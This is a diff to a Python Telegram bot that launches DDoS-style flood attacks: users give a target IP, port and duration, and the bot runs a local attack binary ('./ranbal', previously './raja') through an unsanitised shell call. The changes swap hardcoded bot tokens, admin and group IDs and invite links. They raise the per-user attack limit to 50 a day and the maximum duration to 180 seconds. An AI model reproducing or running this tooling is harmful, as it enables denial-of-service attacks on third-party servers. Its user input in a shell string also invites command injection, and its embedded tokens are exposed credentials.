@@ -8,19 +8,19 @@ import aiohttp
 import threading
 import random
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('8026353575:AAED98zjKTN3WnJZo9W1ua9xrEejn5QIY_o')
+bot = telebot.TeleBot('6704057021:AAHPI7LcxVkUTmTZ75ulA41pU0tS0BSxm8k')
 
 
 # Admin user IDs
-admin_id = ["1636884874"]
+admin_id = ["5759284972"]
 
 # Group and channel details
-GROUP_ID = "-1002407191774"
-CHANNEL_USERNAME = "@ApexCheatsOp"
+GROUP_ID = "-1002217220568"
+CHANNEL_USERNAME = "https://t.me/+yjGbtaSabqY1MGE1"
 
 # Default cooldown and attack limits
 COOLDOWN_TIME = 0  # Cooldown in seconds
-ATTACK_LIMIT = 10  # Max attacks per day
+ATTACK_LIMIT = 50  # Max attacks per day
 global_pending_attack = None
 global_last_attack_time = None
 pending_feedback = {}  # यूजर 
@@ -135,7 +135,7 @@ def handle_attack(message):
         return
 
     if time_duration > 120:
-        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 𝟏𝟐𝟎𝐬!**")
+        bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 𝟏8𝟎𝐬!**")
         return
 
     # Get the user's profile picture
@@ -161,7 +161,7 @@ def handle_attack(message):
 
     pending_feedback[user_id] = True  
 
-    full_command = f"./raja {target} {port} {time_duration} 900"
+    full_command = f"./ranbal {target} {port} {time_duration} 1011 978"
 
     try:
         subprocess.run(full_command, shell=True, check=True)
@@ -309,7 +309,7 @@ def welcome_start(message):
 ⚡ 𝐁𝐄 𝐓𝐇𝐄 𝐊𝐈𝐍𝐆, 𝐃𝐎𝐌𝐈𝐍𝐀𝐓𝐄 𝐓𝐇𝐄 𝐖𝐄𝐁!  
 
 🔗 **𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐁𝐨𝐭, 𝐉𝐨𝐢𝐧 𝐍𝐨𝐰:**  
-👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢 𝙂𝙧𝙤𝙪𝙥](https://t.me/GreeboKaRaja) 🚀🔥"""
+👉 [𝙏𝙚𝙡𝙚𝙜𝙧𝙖𝙢](https://t.me/+yjGbtaSabqY1MGE1) 🚀🔥"""
     
     bot.reply_to(message, response, parse_mode="Markdown")
 # Function to reset daily limits automatically
